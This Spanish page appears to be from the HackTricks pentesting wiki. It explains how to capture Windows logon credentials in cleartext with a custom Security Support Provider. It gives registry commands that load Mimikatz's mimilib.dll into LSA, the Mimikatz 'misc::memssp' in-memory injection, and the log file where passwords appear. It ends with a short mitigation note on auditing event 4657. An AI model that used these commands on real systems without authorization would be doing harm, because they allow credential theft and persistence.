<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>


## SSP Personalizado

[Aprende qué es un SSP (Proveedor de Soporte de Seguridad) aquí.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** utilizadas para acceder a la máquina.

### Mimilib

Puedes usar el binario `mimilib.dll` proporcionado por Mimikatz. **Esto registrará en un archivo todas las credenciales en texto claro.**\
Coloca el dll en `C:\Windows\System32\`\
Obtén una lista de los Paquetes de Seguridad LSA existentes:

{% code title="atacante@objetivo" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Agrega `mimilib.dll` a la lista de Proveedores de Soporte de Seguridad (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Y después de un reinicio, todas las credenciales se pueden encontrar en texto claro en `C:\Windows\System32\kiwissp.log`

### En memoria

También puedes inyectar esto en memoria directamente usando Mimikatz (ten en cuenta que podría ser un poco inestable/no funcionar):
```powershell
privilege::debug
misc::memssp
```
Esto no sobrevivirá a los reinicios.

### Mitigación

ID de evento 4657 - Auditoría de creación/cambio de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
